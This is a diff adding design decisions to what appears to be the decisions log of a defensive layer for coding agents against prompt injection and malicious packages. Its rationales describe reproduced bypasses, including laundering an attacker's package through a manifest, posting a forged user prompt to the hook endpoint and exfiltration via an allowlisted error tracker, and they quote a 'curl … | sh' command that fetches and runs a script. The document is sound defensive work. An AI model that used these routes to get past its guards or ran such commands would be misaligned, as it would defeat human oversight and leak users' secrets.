@@ -171,3 +171,46 @@ Status key: **Settled** (don't change without the human) · **Default** (agent m
 - **Decision:** The workspace is mounted read-only and copied into the container. The result is shown as a diff against that starting copy.
 - **Why:** An agent can't damage the real folder, whatever it's told to do.
 - **Revisit when:** Someone needs one-click apply.
+
+### D26. Manifests are trusted as they were at run start, not when read — Default (changes plan §6.1)
+- **Decision:**
+  - Dependencies declared in the workspace's manifests before the run starts are trusted. Control gets them from outside the sandbox: the runner's read-only copy (web runs), the launcher (`lineage run`), or the replay script.
+  - Reading a manifest during the run is ordinary workspace content (`checked`).
+  - Text the agent writes with Edit/Write is never a source.
+  - A `checked` sighting never raises a name that is already `untrusted`.
+- **Why:** The old rule (any manifest read is trusted) let an agent add an attacker's package to `package.json`, read it back, and have L1a allow `npx` on it. Copying a name into any file also turned an L1a deny into an L3 ask. Both were reproduced, then fixed (`tests/integration/test_laundering.py`).
+- **Cost:** If a repo file mentions a name *after* untrusted content did, the name stays untrusted (L1b ask instead of L3 ask). That's the safe direction.
+
+### D27. A bare install is judged on the names the agent added to manifests — Default
+- **Decision:** `npm install`, `npm ci`, `pnpm install`, `yarn`, `uv sync` and similar are high-risk. When the command names no package, the names the agent added to a manifest during the run are its decision entities.
+- **Limit:** Additions are tracked from Edit/Write on a manifest, and from shell commands that mention a manifest file or use `npm pkg set`. A manifest rewritten by a script the agent wrote isn't seen. The registry stub (404 for everything) and egress are the backstop.
+
+### D28. S2: a user prompt counts only if it really came from the user — Settled
+- **Decision:**
+  - The operator's task is trusted from run creation.
+  - Web-started runs (`claude -p`) have exactly one prompt, so no other UserPromptSubmit text is ever trusted.
+  - Terminal runs trust a typed prompt once the model tap sees the same text in a user text block (not a `tool_result`, not a `<system-reminder>`).
+  - Unverified prompts are recorded and shown (`prompt_unverified`), and their names stay untrusted.
+- **Why:** The hook endpoint is reachable from the agent's own shell with its own hook token, so a script could post a fake prompt and make L1a allow an attacker's package. Reproduced, then fixed.
+- **Residual risk (terminal runs only):** The agent holds its run token, so a hijacked agent could forge a model request containing the fake prompt to corroborate it. Web runs aren't affected.
+
+### D29. For code-running actions, a URL is judged by its full path — Default (refines D10)
+- **Decision:** When an action runs code (`curl … | sh`, `pip install <url>`), a URL first seen in untrusted content triggers L1a even on a trusted host. Plain network calls are still judged by host.
+- **Why:** The scorecard found `curl -s http://registry.demo/<attacker path> | sh` was allowed. A trusted registry serves anyone's script. (An earlier version only caught it because `install.sh` was parsed as a hostname.)
+
+### D30. "Without Lineage" baseline mode, and a fair attack destination — Default
+- **Decision:**
+  - Runs take `protection: lineage | baseline`. A baseline run holds the real secret, its tool calls aren't judged (the dashboard records what Lineage would have done), and egress applies only the host allowlist, the same one Lineage runs use.
+  - The forged issue exfiltrates to `errortrack.demo/api/7741/…`, standing in for an attacker's own project on the team's allowlisted error tracker. It is in `egress.allow_hosts` (reachable) but not in `allowlist.hosts` (trusted).
+- **Why:** Any allowlist blocks `collector.demo`, so a before/after against it would be unfair. The real 2026 attacks went through approved services.
+
+### D31. Strict mode covers the request that would complete the trifecta — Default
+- **Decision:** Egress traffic turns on the `external` leg (previously only WebFetch did). A run with `untrusted` and `private` on is treated as strict for its first outbound request, at both the hook (T1 ask) and egress (T1 block).
+- **Why:** Otherwise the first leaking request goes out before strict mode starts.
+
+### D32. The scorecard assumes the operator approves every prompt — Settled
+- **Decision:** `control/scorecard.py` plays each attack through the real hook handlers and egress rules, as a normal gateway and as Lineage. An "ask" counts as approved, so an attack only counts as stopped if a layer stops it without the human. Scenarios are labelled as *modeled on* public incidents, not reproductions.
+
+### D33. Planted bug reports reach the agent as a root-owned file — Default
+- **Decision:** The runner copies the issue list into `/etc/lineage/errortrack_issues.json` before the container starts.
+- **Rejected:** An environment variable. The agent could print it with `env`, and that output counts as ordinary workspace content, a second path for the attacker's text that isn't marked untrusted.
